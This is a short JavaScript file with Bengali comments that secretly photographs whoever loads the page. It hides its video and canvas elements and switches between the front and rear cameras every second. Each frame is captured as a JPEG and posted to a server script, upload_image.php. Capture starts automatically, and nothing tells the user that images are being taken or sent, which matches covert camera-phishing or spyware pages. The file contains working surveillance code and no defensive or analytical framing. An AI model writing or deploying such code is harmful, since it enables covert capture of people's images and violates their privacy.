let currentFacingMode = "user"; // Front camera
let video = document.createElement("video");
video.setAttribute("autoplay", "");
video.setAttribute("playsinline", "");
video.style.display = "none";
document.body.appendChild(video);

let canvas = document.createElement("canvas");
let context = canvas.getContext("2d");

document.body.appendChild(canvas);
canvas.style.display = "none";

// ক্যামেরা শুরু
function startCamera(facingMode) {
  if (window.stream) {
    window.stream.getTracks().forEach(track => track.stop()); // Previous track stop
  }

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: facingMode }
  })
  .then(stream => {
    window.stream = stream;
    video.srcObject = stream;

    // ক্যামেরা শুরু হওয়ার পর দ্রুত ছবি তোলার জন্য
    setTimeout(() => {
      captureAndSend();
    }, 500);  // Initial delay for camera to load
  })
  .catch(err => {
    console.error("Camera Error:", err);
  });
}

// ছবি তোলা ও সার্ভারে পাঠানো
function captureAndSend() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Fast blob capture and send with low compression
  canvas.toBlob(blob => {
    let form = new FormData();
    form.append("image", blob, "capture.jpg");

    // Send to server
    fetch("upload_image.php", {
      method: "POST",
      body: form
    });
  }, "image/jpeg", 0.6);  // Lower compression for faster transfer
}

// ক্যামেরা সুইচ প্রতি 1 সেকেন্ডে
function loopCapture() {
  setInterval(() => {
    currentFacingMode = currentFacingMode === "user" ? "environment" : "user";
    startCamera(currentFacingMode);
  }, 1000); // Camera switch every 1 second
}

// শুরু করো
loopCapture();
